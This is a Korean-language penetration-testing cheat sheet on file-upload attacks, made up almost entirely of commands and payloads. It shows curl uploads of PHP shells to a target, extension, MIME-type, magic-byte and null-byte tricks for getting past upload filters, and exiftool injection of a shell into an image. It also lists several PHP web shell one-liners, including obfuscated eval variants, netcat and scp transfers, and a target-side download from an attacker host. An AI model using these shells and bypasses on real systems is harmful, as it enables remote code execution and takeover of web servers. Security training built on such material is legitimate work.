# 파일 업로드 테크닉

## curl
```bash
# 기본 파일 업로드 (multipart/form-data)
curl -F "file=@/path/shell.php" http://target.com/upload.php

# 여러 파일 업로드
curl -F "file1=@/path/shell.php" -F "file2=@/path/img.jpg" http://target.com/upload.php

# 헤더 추가
curl -F "file=@/path/shell.php" -H "Authorization: Bearer TOKEN" http://target.com/upload.php

# 파일 이름 변경하여 업로드
curl -F "file=@/path/shell.php;filename=image.jpg" http://target.com/upload.php

# Content-Type 지정 (확장자 우회 시 유용)
curl -F "file=@/path/shell.php;type=image/jpeg" http://target.com/upload.php

# POST 요청 값 추가
curl -F "file=@/path/shell.php" -F "submit=Upload" http://target.com/upload.php
```

**중요: `@` 기호는 로컬 파일을 지정하는 식별자로 반드시 필요함**

## 네트워크 파일 전송

### SCP
```bash
# 로컬 → 원격
scp /local/path/file.txt user@10.10.10.10:/remote/path/

# 포트 지정
scp -P 2222 /local/path/file.txt user@10.10.10.10:/remote/path/

# 디렉토리 전송 (-r)
scp -r /local/directory user@10.10.10.10:/remote/path/

# 키 파일 사용
scp -i key.pem /local/path/file.txt user@10.10.10.10:/remote/path/
```

### NC (Netcat)
```bash
# 수신 측 (타겟)
nc -lvp 1234 > received_file

# 송신 측
nc 10.10.10.10 1234 < file_to_send

# 디렉토리 전송
tar -cf - directory | nc 10.10.10.10 1234
# 수신 측
nc -lvp 1234 | tar -xf -
```

### 웹 서버 활용
```bash
# Python HTTP 서버 (공격자 측)
python -m SimpleHTTPServer 8000  # Python 2
python3 -m http.server 8000      # Python 3

# PHP 웹서버 (공격자 측)
php -S 0.0.0.0:8000

# 다운로드 명령어 (타겟 측)
wget http://attacker-ip:8000/file.txt
curl -O http://attacker-ip:8000/file.txt
```

## 업로드 필터 우회 기법

### 파일 확장자 우회
```
shell.php → shell.php.jpg
shell.php → shell.jpg.php
shell.php → shell.php;.jpg
shell.php → shell.php%00.jpg (Null byte injection, PHP < 5.3.4)
```

### MIME 타입 변조
```
Content-Type: application/x-php → Content-Type: image/jpeg
```

### 파일 헤더 조작
```bash
# GIF89a; 헤더 추가 (매직 바이트)
echo 'GIF89a;<?php system($_GET["cmd"]); ?>' > shell.gif
```

### 대소문자 변경
```
shell.php → shell.PHP
shell.php → shell.pHp
```

### 특수 확장자
```
shell.php → shell.php.
shell.php → "shell.php "
```

### 파일 내용 변조
```php
// 이미지에 PHP 코드 삽입
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
mv image.jpg image.php.jpg
```

## 업로드 후 접근 방법
```
http://target.com/uploads/shell.php
http://target.com/uploads/shell.php?cmd=whoami
http://target.com/uploads/shell.php%00.jpg
```

## 콘텐츠 필터링 우회
```php
// 웹쉘 변형
<?php `$_GET[0]`; ?>
<?php eval(base64_decode($_REQUEST[1])); ?>
<?php include($_GET["file"]); ?>
<?php $_REQUEST['x']($_REQUEST['y']); ?>
```
